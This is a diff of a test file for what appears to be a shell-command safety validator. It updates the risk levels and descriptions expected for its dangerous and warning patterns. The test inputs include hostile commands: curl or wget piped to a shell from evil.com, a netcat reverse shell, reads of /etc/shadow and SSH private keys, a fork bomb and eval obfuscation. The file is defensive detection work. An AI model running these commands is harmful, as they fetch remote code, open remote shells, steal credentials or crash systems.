@@ -56,31 +56,31 @@ describe('Validation Constants', () => {
     it('should detect curl | bash', () => {
       const curlBashPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('curl http://evil.com | bash'));
       expect(curlBashPattern).toBeDefined();
-      expect(curlBashPattern?.riskLevel).toBe('high');
+      expect(curlBashPattern?.riskLevel).toBe('critical');
     });
 
     it('should detect wget | sh', () => {
       const wgetShPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('wget http://evil.com | sh'));
       expect(wgetShPattern).toBeDefined();
-      expect(wgetShPattern?.riskLevel).toBe('high');
+      expect(wgetShPattern?.riskLevel).toBe('critical');
     });
 
     it('should detect reverse shell attempts', () => {
       const ncPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('nc -e /bin/sh evil.com 4444'));
       expect(ncPattern).toBeDefined();
-      expect(ncPattern?.riskLevel).toBe('high');
+      expect(ncPattern?.riskLevel).toBe('critical');
     });
 
     it('should detect sensitive file access', () => {
       const shadowPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('cat /etc/shadow'));
       expect(shadowPattern).toBeDefined();
-      expect(shadowPattern?.riskLevel).toBe('high');
+      expect(shadowPattern?.riskLevel).toBe('critical');
     });
 
     it('should detect SSH key access', () => {
       const sshPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('cat ~/.ssh/id_rsa'));
       expect(sshPattern).toBeDefined();
-      expect(sshPattern?.riskLevel).toBe('high');
+      expect(sshPattern?.riskLevel).toBe('critical');
     });
 
     it('should detect kill -9 1', () => {
@@ -92,13 +92,13 @@ describe('Validation Constants', () => {
     it('should detect base64 obfuscation', () => {
       const base64Pattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('$(echo test | base64)'));
       expect(base64Pattern).toBeDefined();
-      expect(base64Pattern?.riskLevel).toBe('medium');
+      expect(base64Pattern?.riskLevel).toBe('high');
     });
 
     it('should detect dynamic eval', () => {
       const evalPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('eval $(echo rm)'));
       expect(evalPattern).toBeDefined();
-      expect(evalPattern?.riskLevel).toBe('medium');
+      expect(evalPattern?.riskLevel).toBe('high');
     });
 
     it('should not match safe commands', () => {
@@ -133,7 +133,7 @@ describe('Validation Constants', () => {
     it('should warn about sudo', () => {
       const sudoPattern = WARNING_PATTERNS.find(p => p.pattern.test('sudo apt-get install'));
       expect(sudoPattern).toBeDefined();
-      expect(sudoPattern?.description).toContain('sudo');
+      expect(sudoPattern?.description).toContain('privileges');
     });
 
     it('should warn about rm -rf', () => {
@@ -145,25 +145,19 @@ describe('Validation Constants', () => {
     it('should warn about chmod 777', () => {
       const chmodPattern = WARNING_PATTERNS.find(p => p.pattern.test('chmod 777 file'));
       expect(chmodPattern).toBeDefined();
-      expect(chmodPattern?.description).toContain('world-writable');
+      expect(chmodPattern?.description).toContain('permissive');
     });
 
-    it('should warn about curl pipe', () => {
-      const curlPipePattern = WARNING_PATTERNS.find(p => p.pattern.test('curl http://example.com | something'));
-      expect(curlPipePattern).toBeDefined();
-      expect(curlPipePattern?.description).toContain('curl');
+    it('should warn about curl -k (insecure SSL)', () => {
+      const curlInsecurePattern = WARNING_PATTERNS.find(p => p.pattern.test('curl -k http://example.com'));
+      expect(curlInsecurePattern).toBeDefined();
+      expect(curlInsecurePattern?.description).toContain('SSL');
     });
 
-    it('should warn about wget pipe', () => {
-      const wgetPipePattern = WARNING_PATTERNS.find(p => p.pattern.test('wget http://example.com | something'));
-      expect(wgetPipePattern).toBeDefined();
-      expect(wgetPipePattern?.description).toContain('wget');
-    });
-
-    it('should warn about exec', () => {
-      const execPattern = WARNING_PATTERNS.find(p => p.pattern.test('exec newshell'));
-      expect(execPattern).toBeDefined();
-      expect(execPattern?.description).toContain('exec');
+    it('should warn about fork bomb patterns', () => {
+      const forkBombPattern = WARNING_PATTERNS.find(p => p.pattern.test(':(){:|:&};:'));
+      expect(forkBombPattern).toBeDefined();
+      expect(forkBombPattern?.description).toContain('Fork bomb');
     });
 
     it('should warn about disk device access', () => {
